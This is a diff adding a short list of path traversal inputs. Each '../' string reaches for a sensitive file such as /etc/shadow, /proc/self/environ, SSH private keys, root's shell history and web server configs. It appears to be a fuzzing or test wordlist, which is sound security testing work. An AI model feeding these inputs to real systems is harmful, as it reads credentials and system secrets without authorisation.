@@ -1,0 +1,17 @@
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/group
+../../../../proc/self/environ
+../../../../var/log/auth.log
+../../../../var/log/syslog
+../../../../var/www/html/index.php
+../../../../home/user/.ssh/id_rsa
+../../../../root/.bash_history
+../../../../root/.ssh/authorized_keys
+../../../../boot/grub/grub.cfg
+../../../../etc/apache2/apache2.conf
+../../../../etc/nginx/nginx.conf
+../../
+../
